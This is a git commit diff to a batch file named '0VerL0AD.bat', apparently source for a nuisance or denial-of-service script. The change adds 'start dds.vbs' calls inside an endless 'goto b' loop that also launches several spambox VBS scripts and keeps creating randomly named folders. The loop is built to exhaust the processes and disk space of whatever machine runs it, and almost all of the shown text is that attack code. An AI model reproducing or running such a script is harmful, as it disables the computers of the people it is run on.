c3e86a2cb90e83a2782e6c7fc48a8642985edc65
MDYON <56523829+MDYON@users.noreply.github.com>
2020-01-28 15:15:57 -0800

    Add files via upload

--- 0VerL0AD_source_code/0VerL0AD.bat
+++ 0VerL0AD_source_code/0VerL0AD.bat
@@ -5,7 +5,6 @@ goto a
 
 :a
  start light.vbs
- start dds.vbs
  goto b
 
 :b
@@ -14,10 +13,12 @@ goto a
  start spambox2.vbs
  start spambox3.vbs
  start spambox4.vbs
+ start dds.vbs
  start spambox.vbs
  start spambox2.vbs
  start spambox3.vbs
  start spambox4.vbs
+ start dds.vbs
 md %random%
 /folder.
 goto b
